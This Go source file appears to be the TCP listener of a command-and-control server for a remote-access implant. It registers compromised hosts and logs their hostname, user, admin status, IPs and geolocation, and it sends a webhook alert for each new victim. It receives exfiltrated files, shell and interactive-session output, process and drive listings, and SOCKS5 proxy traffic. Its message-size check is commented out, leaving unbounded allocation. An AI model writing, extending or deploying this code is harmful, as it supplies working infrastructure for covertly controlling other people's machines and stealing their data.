package tcp

import (
	"BackendTemplate/pkg/command"
	"BackendTemplate/pkg/connection"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/encrypt"
	"BackendTemplate/pkg/interactive"
	"BackendTemplate/pkg/logger"
	"BackendTemplate/pkg/qqwry"
	"BackendTemplate/pkg/utils"
	"BackendTemplate/pkg/webhooks"
	"bufio"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"
)

// TCPClient TCP客户端结构
type TCPClient struct {
	Conn          net.Conn
	UID           string
	WriteMu       sync.Mutex
	StopChan      chan struct{}
	LastHeartbeat time.Time
	TimeoutCount  int
	IsClosed      bool
	CloseOnce     sync.Once
	Reader        *bufio.Reader
}

// TCPServer TCP服务器结构
type TCPServer struct {
	Listener net.Listener
	StopChan chan struct{}
}

// TCPClientManager TCP客户端管理器
type TCPClientManager struct {
	Clients map[string]*TCPClient
	Mu      sync.RWMutex
}

var (
	globalTCPClientManager = &TCPClientManager{
		Clients: make(map[string]*TCPClient),
	}
)

// Add 添加客户端到管理器
func (cm *TCPClientManager) Add(uid string, client *TCPClient) {
	cm.Mu.Lock()
	defer cm.Mu.Unlock()
	cm.Clients[uid] = client
	logger.Info("TCP client added:", uid, "Total TCP clients:", len(cm.Clients))
}

// Remove 从管理器移除客户端
func (cm *TCPClientManager) Remove(uid string) {
	cm.Mu.Lock()
	defer cm.Mu.Unlock()
	if client, exists := cm.Clients[uid]; exists {
		if !client.IsClosed {
			client.Close()
		}
		delete(cm.Clients, uid)
		logger.Info("TCP client removed:", uid, "Total TCP clients:", len(cm.Clients))
	}
}

// Get 获取客户端
func (cm *TCPClientManager) Get(uid string) (*TCPClient, bool) {
	cm.Mu.RLock()
	defer cm.Mu.RUnlock()
	client, exists := cm.Clients[uid]
	return client, exists
}

// CloseAll 关闭所有客户端
func (cm *TCPClientManager) CloseAll() {
	cm.Mu.Lock()
	defer cm.Mu.Unlock()
	for uid, client := range cm.Clients {
		if !client.IsClosed {
			client.Close()
		}
		delete(cm.Clients, uid)
	}
	logger.Info("All TCP clients closed")
}

// Close 安全关闭TCP客户端
func (c *TCPClient) Close() {
	c.CloseOnce.Do(func() {
		c.IsClosed = true

		// 关闭停止通道
		if c.StopChan != nil {
			close(c.StopChan)
		}

		// 关闭TCP连接
		if c.Conn != nil {
			c.Conn.Close()
		}

		// 从全局管理器移除
		if c.UID != "" {
			globalTCPClientManager.Remove(c.UID)
		}

		// 从连接类型管理器移除
		connection.MuClientListenerType.Lock()
		delete(connection.ClientListenerType, c.UID)
		connection.MuClientListenerType.Unlock()

		// 更新数据库状态为离线
		if c.UID != "" {
			database.Engine.Where("uid = ?", c.UID).Update(&database.Clients{Online: "2"})
			logger.Info("TCP client marked as offline:", c.UID)
		}

		logger.Info("TCP connection closed for client:", c.UID)
	})
}

// Write 安全发送数据
func (c *TCPClient) Write(data []byte) error {
	c.WriteMu.Lock()
	defer c.WriteMu.Unlock()

	if c.IsClosed {
		return fmt.Errorf("connection closed")
	}

	c.Conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	_, err := c.Conn.Write(data)
	return err
}

// WriteWithLength 发送带长度的消息
func (c *TCPClient) WriteWithLength(data []byte) error {
	// 创建带长度的消息
	length := uint32(len(data))
	buf := make([]byte, 4+len(data))
	binary.BigEndian.PutUint32(buf[:4], length)
	copy(buf[4:], data)

	return c.Write(buf)
}

// startHeartbeatCheck 启动心跳检查
func (c *TCPClient) startHeartbeatCheck() {
	defer func() {
		if r := recover(); r != nil {
			logger.Error("TCP heartbeat checker panic recovered:", r)
		}
	}()

	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			if c.IsClosed {
				return
			}

			// 检查心跳是否超时
			if time.Since(c.LastHeartbeat) > 30*time.Second {
				c.TimeoutCount++
				logger.Warn("TCP heartbeat timeout for client:", c.UID, "Timeout count:", c.TimeoutCount)

				if c.TimeoutCount >= 3 {
					logger.Info("Max TCP heartbeat timeout reached, closing connection for client:", c.UID)
					c.Close()
					return
				}
			}

			// 可选：发送心跳检查包
			if c.TimeoutCount > 0 {
				heartbeatMsg := make([]byte, 8)
				binary.BigEndian.PutUint32(heartbeatMsg[:4], 3) // 心跳类型
				binary.BigEndian.PutUint32(heartbeatMsg[4:], 0) // 空内容
				c.Write(heartbeatMsg)
			}

		case <-c.StopChan:
			return
		}
	}
}

// HandleTcpConnection 处理TCP连接
func HandleTcpConnection(conn net.Conn) {
	logger.Info("New TCP connection from:", conn.RemoteAddr())

	// 创建客户端对象
	client := &TCPClient{
		Conn:          conn,
		StopChan:      make(chan struct{}),
		LastHeartbeat: time.Now(),
		IsClosed:      false,
		Reader:        bufio.NewReaderSize(conn, 1024*1024), // 增加缓冲区大小
	}

	defer func() {
		// 异常恢复
		if r := recover(); r != nil {
			logger.Error("TCP handler panic recovered:", r, "from:", conn.RemoteAddr())
		}
		// 确保连接被关闭
		client.Close()
		logger.Info("TCP handler finished for:", conn.RemoteAddr())
	}()

	// 设置连接超时
	conn.SetDeadline(time.Now().Add(30 * time.Second))

	// 主消息处理循环
	for {
		if client.IsClosed {
			break
		}

		// 重置读取超时
		conn.SetReadDeadline(time.Now().Add(30 * time.Second))

		// 1. 读取消息长度 - 添加更严格的检查
		var length uint32
		err := binary.Read(client.Reader, binary.BigEndian, &length)
		if err != nil {
			if err == io.EOF {
				logger.Info("Client closed connection:", conn.RemoteAddr())
			} else if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				logger.Info("TCP read timeout for:", conn.RemoteAddr())
				// 可以添加心跳检查或直接断开
				break
			} else {
				logger.Error("Error reading message length:", err, "from:", conn.RemoteAddr())
			}
			break
		}

		// 验证消息长度（防止恶意攻击）
		if length == 0 {
			logger.Warn("Received zero-length message from:", conn.RemoteAddr())
			continue
		}

		// 更严格的长度限制
		//if length > 10*1024*1024 { // 限制为10MB
		//	logger.Error("Message too large:", length, "from:", conn.RemoteAddr())
		//	// 发送错误响应并断开
		//	break
		//}

		// 最小长度检查（至少需要4字节的消息类型）
		if length < 4 {
			logger.Error("Message length too short:", length, "from:", conn.RemoteAddr())
			break
		}

		// 2. 读取消息内容 - 使用带限制的读取
		message := make([]byte, length)
		bytesRead, err := io.ReadFull(client.Reader, message)
		if err != nil {
			if err == io.EOF {
				logger.Info("Client closed connection while reading:", conn.RemoteAddr())
			} else if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				logger.Info("TCP read content timeout for:", conn.RemoteAddr())
			} else {
				logger.Error("Error reading message content:", err, "from:", conn.RemoteAddr())
			}
			break
		}

		// 验证实际读取的字节数
		if uint32(bytesRead) != length {
			logger.Error("Message length mismatch, expected:", length, "actual:", bytesRead)
			break
		}

		// 3. 解析消息类型 - 添加边界检查
		msgType := binary.BigEndian.Uint32(message[:4])

		// 处理消息
		switch msgType {
		case 1: // firstBlood
			if len(message) < 5 { // 至少需要类型+1字节数据
				logger.Error("FirstBlood message too short from:", conn.RemoteAddr())
				break
			}

			msg := message[4:]
			if len(msg) == 0 {
				logger.Error("Empty FirstBlood payload from:", conn.RemoteAddr())
				break
			}

			tmpMetainfo, err := encrypt.DecodeBase64(msg)
			if err != nil {
				logger.Error("DecodeBase64 failed:", err, "from:", conn.RemoteAddr())
				break
			}

			metainfo, err := encrypt.Decrypt(tmpMetainfo)
			if err != nil {
				logger.Error("Decrypt failed:", err, "from:", conn.RemoteAddr())
				break
			}

			// 验证metainfo长度
			if len(metainfo) < 9 {
				logger.Error("Metainfo too short:", len(metainfo), "from:", conn.RemoteAddr())
				break
			}

			uid := encrypt.BytesToMD5(metainfo)
			client.UID = uid
			client.LastHeartbeat = time.Now()
			client.TimeoutCount = 0

			// 添加到全局管理器
			globalTCPClientManager.Add(uid, client)

			// 更新连接类型
			connection.MuClientListenerType.Lock()
			connection.ClientListenerType[uid] = "tcp"
			connection.MuClientListenerType.Unlock()

			// 启动心跳检查
			go client.startHeartbeatCheck()

			// 检查客户端是否已存在
			var existingClient database.Clients
			exists, _ := database.Engine.Where("uid = ?", uid).Get(&existingClient)

			if !exists { // FirstBlood
				if len(metainfo) < 9 {
					logger.Error("Metainfo too short for parsing:", conn.RemoteAddr())
					break
				}

				processID := binary.BigEndian.Uint32(metainfo[:4])
				flag := int(metainfo[4])

				// 检查是否有足够字节解析IP
				if len(metainfo) < 9 {
					logger.Error("Metainfo insufficient for IP parsing:", conn.RemoteAddr())
					break
				}

				ipInt := binary.LittleEndian.Uint32(metainfo[5:9])
				localIP := utils.Uint32ToIP(ipInt).String()

				// 安全地获取osInfo
				var osInfo string
				if len(metainfo) > 9 {
					osInfo = string(metainfo[9:])
				}

				// 验证osInfo格式
				osArray := strings.Split(osInfo, "\t")
				if len(osArray) != 3 {
					logger.Error("Invalid osInfo format, expected 3 parts, got:", len(osArray), "from:", conn.RemoteAddr())
					// 设置默认值防止崩溃
					osArray = []string{"Unknown", "Unknown", "Unknown"}
				}

				hostName := osArray[0]
				UserName := osArray[1]
				processName := osArray[2]

				// 获取外网IP
				remoteAddr := conn.RemoteAddr().String()
				externalIp, _, err := net.SplitHostPort(remoteAddr)
				if err != nil {
					externalIp = remoteAddr
				}
				if externalIp == "::1" {
					externalIp = "127.0.0.1"
				}
				address, _ := qqwry.GetLocationByIP(externalIp)

				currentTime := time.Now()
				timeFormat := "01-02 15:04"
				formattedTime := currentTime.Format(timeFormat)

				arch := "x86"

				if flag > 8 {
					UserName += "*"
					flag = flag - 8
				}
				if flag > 4 {
					arch = "x64"
				}

				// 创建新客户端记录
				c := database.Clients{
					Uid:        uid,
					FirstStart: formattedTime,
					ExternalIP: externalIp,
					InternalIP: localIP,
					Username:   UserName,
					Computer:   hostName,
					Process:    processName,
					Pid:        strconv.Itoa(int(processID)),
					Address:    address,
					Arch:       arch,
					Note:       "",
					Sleep:      "0",
					Online:     "1",
					Color:      "",
				}

				// 插入数据库
				if _, err := database.Engine.Insert(&c); err != nil {
					logger.Error("Failed to insert client:", err)
				}

				// 插入相关表
				database.Engine.Insert(&database.Shell{Uid: uid, ShellContent: ""})
				database.Engine.Insert(&database.Notes{Uid: uid, Note: ""})

				// 发送Webhook通知
				if exists, key := webhooks.CheckEnable(); exists {
					webhooks.SendWecom(c, key)
				}

				logger.Info("New TCP client registered:", uid, "IP:", externalIp)
			} else {
				// 更新在线状态
				database.Engine.Where("uid = ?", uid).Update(&database.Clients{Online: "1"})
				logger.Info("TCP client reconnected:", uid)
			}

		case 2: // otherMsg
			if len(message) < 8 { // 至少需要类型+4字节长度+部分数据
				logger.Error("OtherMsg message too short from:", conn.RemoteAddr())
				break
			}

			msg := message[4:]
			if len(msg) < 4 {
				logger.Error("OtherMsg too short")
				break
			}

			metaLen := binary.BigEndian.Uint32(msg[:4])

			// 验证metaLen
			if metaLen > uint32(len(msg)-4) {
				logger.Error("Invalid meta length:", metaLen, "available:", len(msg)-4)
				break
			}

			if metaLen == 0 {
				logger.Error("Zero meta length")
				break
			}

			metaMsg := msg[4 : 4+metaLen]
			realMsg := msg[4+metaLen:]

			// 验证realMsg不为空
			if len(realMsg) == 0 {
				logger.Error("Empty real message")
				break
			}

			tmpMetainfo, err := encrypt.DecodeBase64(metaMsg)
			if err != nil {
				logger.Error("DecodeBase64 failed:", err)
				break
			}

			metainfo, err := encrypt.Decrypt(tmpMetainfo)
			if err != nil {
				logger.Error("Decrypt failed:", err)
				break
			}

			uid := encrypt.BytesToMD5(metainfo)

			// 检查客户端是否在线
			if _, exists := globalTCPClientManager.Get(uid); !exists {
				logger.Warn("Received message from offline TCP client:", uid)
				break
			}

			dataBytes, err := encrypt.DecodeBase64(realMsg)
			if err != nil {
				logger.Error("DecodeBase64 failed:", err)
				break
			}

			dataBytes, err = encrypt.Decrypt(dataBytes)
			if err != nil {
				logger.Error("First decrypt failed:", err)
				break
			}

			dataBytes, err = encrypt.Decrypt(dataBytes)
			if err != nil {
				logger.Error("Second decrypt failed:", err)
				break
			}

			// 修复的关键点：严格检查dataBytes长度
			if len(dataBytes) < 4 {
				logger.Error("Decrypted data too short:", len(dataBytes))
				break
			}

			replyTypeBytes := dataBytes[:4]
			data := dataBytes[4:]
			replyType := binary.BigEndian.Uint32(replyTypeBytes)

			// 根据replyType进行不同的边界检查
			switch replyType {
			case 0, 31: // 命令行展示或错误展示
				var shell database.Shell
				if _, err := database.Engine.Where("uid = ?", uid).Get(&shell); err == nil {
					if replyType == 31 {
						shell.ShellContent += "!Error: "
					}
					if len(data) > 0 {
						shell.ShellContent += string(data) + "\n"
					}
					database.Engine.Where("uid = ?", uid).Update(&shell)
				}

			case command.PS:
				if len(data) > 0 {
					command.VarPidQueue.Add(uid, string(data))
				}

			case command.FileBrowse:
				if len(data) > 0 {
					command.VarFileBrowserQueue.Add(uid, string(data))
				}

			case 22: // 文件下载第一条信息
				if len(data) < 8 { // 至少4字节长度+部分路径
					logger.Error("File download info too short")
					break
				}

				fileLen := int(binary.BigEndian.Uint32(data[:4]))
				if len(data) < 4 {
					logger.Error("No file path in download info")
					break
				}

				filePath := string(data[4:])
				if filePath == "" {
					logger.Error("Empty file path")
					break
				}

				// 使用安全路径函数
				fullPath, err := utils.GetSafeFilePath(uid, filePath)
				if err != nil {
					logger.Error("Security check failed:", err)
					break
				}

				// 确保下载目录存在
				downloadDir := filepath.Dir(fullPath)
				if err := os.MkdirAll(downloadDir, 0755); err != nil {
					logger.Error("Failed to create download directory:", err)
					break
				}

				// 更新数据库
				sql := `
UPDATE downloads
SET file_size = ?, downloaded_size = ?
WHERE uid = ? AND file_path = ?;
`
				_, err = database.Engine.QueryString(sql, fileLen, 0, uid, filePath)
				if err != nil {
					logger.Error("Database update failed:", err)
				}

				// 检查并删除已存在的文件
				if _, err := os.Stat(fullPath); err == nil {
					if err := os.Remove(fullPath); err != nil {
						logger.Error("Failed to remove existing file:", err)
						break
					}
				}

				// 创建新文件
				fp, err := os.OpenFile(fullPath, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0644)
				if err != nil {
					logger.Error("Failed to create file:", err)
					break
				}
				fp.Close()

			case command.DOWNLOAD: // 文件下载
				if len(data) < 8 { // 至少4字节路径长度+部分路径+部分内容
					logger.Error("Download data too short")
					break
				}

				filePathLen := int(binary.BigEndian.Uint32(data[:4]))
				if len(data) < 4+filePathLen {
					logger.Error("Invalid file path length in download")
					break
				}

				if filePathLen == 0 {
					logger.Error("Zero file path length")
					break
				}

				filePath := string(data[4 : 4+filePathLen])
				fileContent := data[4+filePathLen:]

				// 使用安全路径函数
				fullPath, err := utils.GetSafeFilePath(uid, filePath)
				if err != nil {
					logger.Error("Security check failed:", err)
					break
				}

				var fileDownloads database.Downloads
				if _, err := database.Engine.Where("uid = ? AND file_path = ?", uid, filePath).Get(&fileDownloads); err == nil {
					fileDownloads.DownloadedSize += len(fileContent)
					database.Engine.Where("uid = ? AND file_path = ?", uid, filePath).Update(&fileDownloads)
				}

				// 确保目录存在
				downloadDir := filepath.Dir(fullPath)
				if err := os.MkdirAll(downloadDir, 0755); err != nil {
					logger.Error("Failed to create download directory:", err)
					break
				}

				// 追加文件内容
				fp, err := os.OpenFile(fullPath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
				if err != nil {
					logger.Error("Failed to open file:", err)
					break
				}

				if _, err := fp.Write(fileContent); err != nil {
					logger.Error("Failed to write file content:", err)
				}
				fp.Close()

			case command.DRIVES:
				if len(data) > 0 {
					drives := utils.GetExistingDrives(data)
					command.VarDrivesQueue.Add(uid, drives)
				}

			case command.FileContent:
				if len(data) < 8 { // 至少4字节路径长度+部分路径+部分内容
					logger.Error("File content data too short")
					break
				}

				filePathLen := int(binary.BigEndian.Uint32(data[:4]))
				if len(data) < 4+filePathLen {
					logger.Error("Invalid file path length in file content")
					break
				}

				if filePathLen == 0 {
					logger.Error("Zero file path length")
					break
				}

				filePath := string(data[4 : 4+filePathLen])
				fileContent := data[4+filePathLen:]
				command.VarFileContentQueue.Add(uid, filePath, string(fileContent))

			case command.Socks5Data:
				if len(data) < 16 {
					logger.Error("Socks5 data too short")
					break
				}

				md5sign := data[:16]
				rawData := data[16:]
				command.VarSocks5Queue.Add(uid, fmt.Sprintf("%x", md5sign), string(rawData))
			case command.WriteInteractieShell:
				sessionIDLen := int(binary.BigEndian.Uint32(data[:4]))

				sessionID := string(data[4 : 4+sessionIDLen])
				output := data[4+sessionIDLen:]

				interactive.SendOutputToSession(uid, sessionID, output)
			default:
				logger.Warn("Unknown TCP reply type:", replyType)
			}

		case 3: // heartBeat
			if len(message) < 5 { // 至少需要类型+1字节数据
				logger.Error("HeartBeat message too short from:", conn.RemoteAddr())
				break
			}

			msg := message[4:]
			if len(msg) == 0 {
				logger.Error("Empty HeartBeat payload from:", conn.RemoteAddr())
				break
			}

			tmpMetainfo, err := encrypt.DecodeBase64(msg)
			if err != nil {
				logger.Error("DecodeBase64 failed:", err)
				break
			}

			metainfo, err := encrypt.Decrypt(tmpMetainfo)
			if err != nil {
				logger.Error("Decrypt failed:", err)
				break
			}

			uid := encrypt.BytesToMD5(metainfo)

			// 更新心跳时间
			if c, exists := globalTCPClientManager.Get(uid); exists && !c.IsClosed {
				c.LastHeartbeat = time.Now()
				c.TimeoutCount = 0
			}

		default:
			logger.Warn("Unknown TCP message type:", msgType, "from:", conn.RemoteAddr())
			// 可以选择断开连接或继续
			break
		}
	}
}

// Cleanup 全局清理函数
func Cleanup() {
	logger.Info("Starting TCP cleanup...")
	globalTCPClientManager.CloseAll()
	logger.Info("TCP cleanup completed")
}

// GetClientStats 获取客户端统计信息
func GetClientStats() map[string]interface{} {
	globalTCPClientManager.Mu.RLock()
	defer globalTCPClientManager.Mu.RUnlock()

	stats := make(map[string]interface{})
	stats["total_tcp_clients"] = len(globalTCPClientManager.Clients)

	onlineCount := 0
	for _, client := range globalTCPClientManager.Clients {
		if !client.IsClosed {
			onlineCount++
		}
	}
	stats["online_tcp_clients"] = onlineCount

	return stats
}

// GetClient 获取指定TCP客户端
func GetClient(uid string) *TCPClient {
	if client, exists := globalTCPClientManager.Get(uid); exists && !client.IsClosed {
		return client
	}
	return nil
}

// SendToClient 向指定TCP客户端发送消息
func SendToClient(uid string, message []byte) error {
	client := GetClient(uid)
	if client == nil {
		return fmt.Errorf("TCP client not found or offline")
	}

	return client.Write(message)
}

// BroadcastToAll 广播消息给所有TCP客户端
func BroadcastToAll(message []byte) {
	globalTCPClientManager.Mu.RLock()
	defer globalTCPClientManager.Mu.RUnlock()

	for uid, client := range globalTCPClientManager.Clients {
		if !client.IsClosed {
			if err := client.WriteWithLength(message); err != nil {
				logger.Error("Failed to broadcast to TCP client:", uid, "Error:", err)
			}
		}
	}
}
